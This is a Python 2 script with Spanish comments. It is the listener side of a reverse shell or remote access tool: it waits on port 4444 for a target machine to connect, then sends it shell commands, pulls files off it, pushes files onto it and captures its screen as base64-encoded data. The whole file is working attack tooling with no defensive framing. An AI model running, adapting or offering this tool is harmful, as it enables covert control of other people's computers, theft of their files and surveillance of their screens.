#!/usr/bin/env python
#_*_coding: utf8 _*_


#Librerias
#socket => Abrir puerto tcp
#base64 => conversion binaria

import socket
import base64


def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --descargar, --cargar
    directorio_actual = objetivo.recv(1024)
    contador = 0
    while True:
        comando = raw_input("{}>> ".format(directorio_actual))
    #Comandos: #exit = salir y cerrar servidor, cd = navegación entre directorios, --descargar = descargar archivo, --cargar = cargar archivo
        if comando == "exit":
            objetivo.send(comando)
            break
        elif comando[:2] == "cd":
            objetivo.send(comando)
            respuesta = objetivo.recv(1024) #buffer del servidor
            directorio_actual = respuesta
            print(respuesta)
        elif comando == "":
            pass #ignorar linea y volver terminal
        elif comando[:11] == "--descargar":
            #Descarga de archivo
            objetivo.send(comando)
            with open(comando[12:],'wb') as archivo_descarga: #wb escritura binaria
                datos=objetivo.recv(3000000) #tamaño del archivo mientras mas grande mas alto el buffer
                archivo_descarga.write(base64.b64decode(datos)) #Encargado de convertir carateres codeados en base 64 a texto plano y poder escribir
        elif comando[:8] == "--cargar":
            #Carga de archivo
            try:
                objetivo.send(comando)
                with open(comando[9:],'rb') as archivo_subida: #lectura binaria
                    objetivo.send(base64.b64encode(archivo_subida.read()))                    
            except:
                print("Error de subida")
        elif comando[:9] == "--captura":
            objetivo.send(comando)
            with open("monitor-%d.png" %contador, 'wb') as pantalla:
                datos = objetivo.recv(1000000)
                datos_decodificados = base64.b64decode(datos)
                if datos_decodificados == "fallo":
                    print("Error de captura de pantalla")
                else:
                    pantalla.write(datos_decodificados)
                    print("Captura exitosa")
                    contador = contador + 1
                      
        else:
            #Comandos sin respuestas pero ejecutados
            objetivo.send(comando)
            respuesta=objetivo.recv(30000)
            if respuesta == "1":
                continue 
            else:
                print(respuesta)
#funcion para levantar servidor
def levantar_servidor(ip, puerto):
    global servidor, objetivo
   
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AF_INET = socket para ipv4, SOCK_STREAM = tcp
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind((ip,puerto))
    servidor.listen(1)
    
    print("[+] Servidor activo")
    
    objetivo, ip = servidor.accept()
    print("[+] Conectado :" + ip[0])
    
levantar_servidor("192.168.0.186",4444)
shell()
servidor.close()
    